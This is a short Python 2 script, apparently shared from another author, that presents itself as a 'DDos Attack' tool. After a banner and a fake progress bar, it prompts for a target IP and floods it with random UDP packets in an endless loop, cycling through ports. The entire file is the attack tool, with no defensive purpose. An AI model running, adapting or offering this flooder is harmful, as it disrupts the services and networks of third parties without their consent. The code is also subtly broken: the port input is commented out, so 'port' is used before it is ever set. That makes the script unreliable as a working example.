# THIS IS NOT MY CODE
# ALL CREDIT GOES TO Ha3MrX
# BUT I CHANGED SOME STUFF TO MAKE IT EASIER TO UNDERSTAND




import sys
import os
import time
import socket
import random

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
os.system("clear")
print
print (" ____  ____                 _   _   _             _")
print ("|  _ \\|  _ \\  ___  ___     / \\ | |_| |_ __ _  ___| | __")
print ("| | | | | | |/ _ \\/ __|   / _ \\| __| __/ _' |/ __| |/ /")
print ("| |_| | |_| | (_) \\__ \\  / ___ \\ |_| || (_| | (__|   <")
print ("|____/|____/ \\___/|___/ /_/   \\_\\__|\\__\\__,_|\\___|_|\\_\\")
print
ip = raw_input("IP Target : ")
##port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
os.system("clear")
print ("[                    ] 00%")
time.sleep(1)
os.system("clear")
print ("[==                  ] 10%")
time.sleep(0.2)
os.system("clear")
print ("[====                ] 20%")
time.sleep(0.2)
os.system("clear")
print ("[======              ] 30%")
time.sleep(0.2)
os.system("clear")
print ("[========            ] 40%")
time.sleep(0.7)
os.system("clear")
print ("[==========          ] 50%")
time.sleep(0.2)
os.system("clear")
print ("[============        ] 60%")
time.sleep(0.2)
os.system("clear")
print ("[==============      ] 70%")
time.sleep(0.2)
os.system("clear")
print ("[================    ] 80%")
time.sleep(0.2)
os.system("clear")
print ("[==================  ] 90%")
time.sleep(0.2)
os.system("clear")
print ("[====================] 100%")
time.sleep(1)
os.system("clear")
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
    if port == 65534:
        port = 1

